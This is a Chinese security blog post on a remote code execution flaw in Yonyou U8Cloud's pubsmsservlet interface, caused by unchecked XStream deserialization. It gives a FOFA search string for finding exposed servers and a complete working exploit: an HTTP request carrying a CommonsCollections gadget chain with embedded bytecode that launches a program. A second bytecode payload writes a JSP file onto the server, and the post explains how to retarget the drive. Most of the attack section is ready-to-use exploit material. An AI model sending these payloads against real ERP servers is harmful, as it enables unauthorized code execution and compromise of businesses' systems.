---
title: "用友U8Cloud pubsmsservlet 远程代码执行漏洞"
source: https://mrxn.net/jswz/yonyou-pubsmsservlet-xstream-rce.html
---

# 用友U8Cloud pubsmsservlet 远程代码执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/10/15 12:12
* 2739浏览
* [4评论](#comment)
* 1小时
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)
U8Cloud 是用友网络科技股份有限公司推出的新一代云ERP解决方案，主要聚焦成长型、创新型企业，提供企业级云ERP整体解决方案。U8Cloud所有版本提供的pubsmsservlet接口，服务端对接收的数据进行反序列化操作时未对数据进行有效的校验，导致攻击者可发送精心构造的恶意序列化对象，在服务端
[执行任意代码](https://mrxn.net/tag/rce)
。

# 影响版本

用友U8Cloud V2.0版本

用友U8Cloud V2.1版本

用友U8Cloud V2.3版本

用友U8Cloud V2.5版本

用友U8Cloud V2.6版本

用友U8Cloud V2.7版本

用友U8Cloud V2.65版本

用友U8Cloud V3.0版本

用友U8Cloud V3.1版本

用友U8Cloud V3.2版本

用友U8Cloud V3.5版本

用友U8Cloud V3.6版本

用友U8Cloud V3.6sp版本

用友U8Cloud V5.0版本

用友U8Cloud V5.0sp版本

用友U8Cloud V5.1版本

用友U8Cloud V5.1sp版本

# fofa语法

> app="用友-U8-Cloud"

# 漏洞分析

根据官网漏洞通告

![用友U8Cloud pubsmsservlet 远程代码执行漏洞](https://image.mrxn.net/7dba9e656fc241b0816e1b7084fd4058.webp)

可知漏洞点在
**pubsmsservlet**
接口，那就利用之前的方法，找一下这个接口在那个jar包里，最终在

`pubuapplatform.jar`
找到了
**pubsmsservlet**
的实现方法

![用友U8Cloud pubsmsservlet 远程代码执行漏洞](https://image.mrxn.net/148d6f904e354be8aa62d0fd4d9b3824.webp)

关键点在下面的
`Object pubmsg = xs.fromXML(xmlString);`
直接反序列化
`request.getInputStream();`
的内容，因此就造成了XStream反序列化
[代码执行](https://mrxn.net/tag/rce)
漏洞了。

![用友U8Cloud pubsmsservlet 远程代码执行漏洞](https://image.mrxn.net/5dfed06aae924590bba431f16b489c6c.webp)

# 漏洞复现

```
POST /service/pubsmsservlet HTTP/1.1
Host: nc.mrxn.net
Content-Type: application/x-www-form-urlencoded

<org.apache.commons.collections4.bag.TreeBag serialization="custom">
  <unserializable-parents>
    <size>2</size>
  </unserializable-parents>
  <org.apache.commons.collections4.bag.TreeBag>
    <default/>
    <org.apache.commons.collections4.comparators.TransformingComparator>
      <decorated class="org.apache.commons.collections4.comparators.ComparableComparator"/>
      <transformer class="org.apache.commons.collections4.functors.ChainedTransformer">
        <iTransformers>
          <org.apache.commons.collections4.functors.ConstantTransformer>
            <iConstant class="java-class">com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</iConstant>
          </org.apache.commons.collections4.functors.ConstantTransformer>
          <org.apache.commons.collections4.functors.InstantiateTransformer>
            <iParamTypes>
              <java-class>javax.xml.transform.Templates</java-class>
            </iParamTypes>
            <iArgs>
              <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl serialization="custom">
                <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
                  <default>
                    <__name>a</__name>
                    <__bytecodes>
                      <byte-array>yv66vgAAADQAGQEAAWkHAAEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwADAQAIPGNsaW5pdD4BAAMoKVYBAARDb2RlAQARamF2YS9sYW5nL1J1bnRpbWUHAAgBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAKAAsKAAkADAEACGNhbGMuZXhlCAAOAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAEAARCgAJABIBAAY8aW5pdD4MABQABgoABAAVAQAKU291cmNlRmlsZQEABmkuamF2YQAhAAIABAAAAAAAAgAIAAUABgABAAcAAAAWAAIAAAAAAAq4AA0SD7YAE1exAAAAAAABABQABgABAAcAAAARAAEAAQAAAAUqtwAWsQAAAAAAAQAXAAAAAgAY</byte-array>
                    </__bytecodes>
                    <__transletIndex>-1</__transletIndex>
                    <__indentNumber>0</__indentNumber>
                  </default>
                  <boolean>false</boolean>
                </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
              </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
            </iArgs>
          </org.apache.commons.collections4.functors.InstantiateTransformer>
        </iTransformers>
      </transformer>
    </org.apache.commons.collections4.comparators.TransformingComparator>
    <int>1</int>
    <int>1</int>
    <int>2</int>
  </org.apache.commons.collections4.bag.TreeBag>
</org.apache.commons.collections4.bag.TreeBag>
```

这里弹个计算器吧，证明下吧!

![用友U8Cloud pubsmsservlet 远程代码执行漏洞](https://image.mrxn.net/7f09c9d6ba2444c1a131731da5a35a07.webp)

当然，写文件也是可以的，如下payload会在
`C:\U8CERP\webapps\u8c_web\mx.jsp`
写入文件，可自行修改

```
yv66vgAAADQARAoADQAyCAAzCAA0BwA1CgAEADYHADcKAAYAOAoABgA5CgAGADoKAAQAOgcAOwcAPAcAPQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQATTHB1YnNtc3NlcnZsZXRfZXhwOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwA+AQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAIPGNsaW5pdD4BAAhmaWxlUGF0aAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAC2ZpbGVDb250ZW50AQAKZmlsZVdyaXRlcgEAFExqYXZhL2lvL0ZpbGVXcml0ZXI7AQALcHJpbnRXcml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAA1TdGFja01hcFRhYmxlBwA7AQAKU291cmNlRmlsZQEAFnB1YnNtc3NlcnZsZXRfZXhwLmphdmEMAA4ADwEAIEM6XFU4Q0VSUFx3ZWJhcHBzXHU4Y193ZWJcbXguanNwAQCFPCVvdXQucHJpbnRsbihqYXZhLnV0aWwuVVVJRC5yYW5kb21VVUlEKCkudG9TdHJpbmcoKSk7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPgEAEmphdmEvaW8vRmlsZVdyaXRlcgwADgA/AQATamF2YS9pby9QcmludFdyaXRlcgwADgBADABBAEIMAEMADwEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFwdWJzbXNzZXJ2bGV0X2V4cAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABYoTGphdmEvbGFuZy9TdHJpbmc7WilWAQATKExqYXZhL2lvL1dyaXRlcjspVgEABXByaW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAFY2xvc2UAIQAMAA0AAAAAAAUAAQAOAA8AAQAQAAAALwABAAEAAAAFKrcAAbEAAAACABEAAAAGAAEAAAAJABIAAAAMAAEAAAAFABMAFAAAAAEAFQAWAAIAEAAAAD8AAAADAAAAAbEAAAACABEAAAAGAAEAAAAjABIAAAAgAAMAAAABABMAFAAAAAAAAQAXABgAAQAAAAEAGQAaAAIAGwAAAAQAAQAcAAEAFQAdAAIAEAAAAEkAAAAEAAAAAbEAAAACABEAAAAGAAEAAAAoABIAAAAqAAQAAAABABMAFAAAAAAAAQAXABgAAQAAAAEAHgAfAAIAAAABACAAIQADABsAAAAEAAEAHAAJACIAIwABABAAAAArAAAAAQAAAAGxAAAAAgARAAAABgABAAAALQASAAAADAABAAAAAQAkACUAAAAIACYADwABABAAAACsAAQABAAAACsSAksSA0y7AARZKgO3AAVNuwAGWSy3AAdOLSu2AAgttgAJLLYACqcABEuxAAEAAAAmACkACwADABEAAAAqAAoAAAAOAAMADwAGABMAEAAUABkAFQAeABYAIgAXACYAHAApABkAKgAdABIAAAAqAAQAAwAjACcAKAAAAAYAIAApACgAAQAQABYAKgArAAIAGQANACwALQADAC4AAAAHAAJpBwAvAAABADAAAAACADE=
```

写入D盘的目录只需将EM6改为EQ6即可

访问写入文件,成功
[执行代码](https://mrxn.net/tag/rce)

![用友U8Cloud pubsmsservlet 远程代码执行漏洞](https://image.mrxn.net/ce138f4544624db7b82cddb0803da451.webp)

也可以使用Java chains如下链来生成命令执行回显等探测

![用友U8Cloud pubsmsservlet 远程代码执行漏洞](https://image.mrxn.net/212398998b894186b602bd42db9186f5.webp)

关键点是调用 jacksontostring链子来进行利用。

![用友U8Cloud pubsmsservlet 远程代码执行漏洞](https://image.mrxn.net/d159862de79a4d40bb4ddb8da8aa0318.webp)

执行命令后，访问根目录下的xx.txt即可得到命令执行结果

![用友U8Cloud pubsmsservlet 远程代码执行漏洞](https://image.mrxn.net/0ea413f309db4141bad301b5466c2eaf.webp)

# 参考

* [关于U8cloud所有版本pubsmsservlet接口存在反序列化漏洞的安全公告](https://security.yonyou.com/#/noticeInfo?id=742)

* 标签：
* [#
  漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#
  web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#
  代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#
  Java](https://mrxn.net/tag/Java)
* [#
  rce](https://mrxn.net/tag/rce)
* [#
  用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[用友U8Cloud pubsmsservlet 远程代码执行漏洞](https://mrxn.net/jswz/yonyou-pubsmsservlet-xstream-rce.html)
  
文章链接：
<https://mrxn.net/jswz/yonyou-pubsmsservlet-xstream-rce.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-pubsmsservlet-xstream-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-pubsmsservlet-xstream-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});